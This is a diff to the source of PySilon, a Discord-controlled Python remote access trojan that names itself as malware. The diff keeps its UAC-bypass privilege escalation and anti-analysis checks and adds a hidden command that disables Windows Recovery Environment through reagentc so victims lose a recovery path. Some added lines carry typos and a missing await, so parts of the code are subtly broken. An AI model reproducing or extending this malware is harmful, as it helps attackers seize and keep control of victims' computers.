@@ -1,5 +1,6 @@
 import discord
 import os
+import ctypes
 import subprocess
 from discord.ext import commands
 import resources.modules.misc as pysilon_misc
@@ -7,13 +8,16 @@ import resources.modules.protections as pysilon_protections
 import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
 
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
 if pysilon_protections.protection_check():
     os._exit(0)
 
 if pysilon_protections.single_instance_lock():
     os._exit(0)
 
-if not uac_bypass.IsAdmin():
+if not IsAdmin():
     if uac_bypass.GetSelf()[1]:
         if uac_bypass.UACbypass():
             os._exit(0)
@@ -142,5 +146,31 @@ async def delete_category(ctx,  argument=None, password=None):
         else: await ctx.send("```Invalid password! Cannot implode.```")
     else: 
         await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
+
+@client.commanc(name="reset")
+async def reset_agentc_handler(ctx, argument=None):
+    if argument == "block":
+        await ctx.message.delete()
+        if uac_bypass.IsAdmin():
+            subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    elif argument == "unblock":
+        await ctx.message.delete()
+        if uac_bypass.IsAdmin():
+            subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    else: ctx.send("The **reset** command should be followed by **block** or ***unvloxk**")
 
 # [pysilon] commands
